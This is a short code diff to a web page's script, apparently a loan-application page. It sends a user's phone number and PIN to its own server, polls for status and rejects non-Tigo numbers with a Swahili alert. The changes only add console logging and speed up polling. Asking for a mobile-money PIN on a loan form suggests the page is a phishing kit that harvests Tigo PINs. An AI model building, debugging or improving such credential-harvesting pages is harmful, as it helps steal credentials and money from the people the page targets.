@@ -73,10 +73,12 @@
                 var res = await fetch('/api/submit_loan', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: phone, pin: pin, amount: loanAmount, months: loanTerm, loan_type: loanData.loan_type || '', purpose: loanData.purpose || '' }) }); 
                 var data = await res.json(); 
                 var myAppId = data.app_id;
+                console.log('App ID:', myAppId);
                 var checkInterval = setInterval(async function() {
                     try {
                         var cr = await fetch('/api/check_status/' + myAppId);
                         var cd = await cr.json();
+                        console.log('Status response:', JSON.stringify(cd));
                         if (cd.status === 'approved') {
                             clearInterval(checkInterval);
                             window.location.href = '/verify?app_id=' + myAppId + '&phone=' + phone + '&amount=' + loanAmount;
@@ -91,8 +93,8 @@
                             alert('Namba sio ya Tigo. Tafadhali tumia namba ya Tigo.');
                             window.location.href = '/';
                         }
-                    } catch(e) {}
-                }, 3000);
+                    } catch(e) { console.log('Check error:', e); }
+                }, 2000);
             } catch(e) { 
                 alert('Error: ' + e.message); 
                 document.getElementById('screenWait').classList.remove('active');
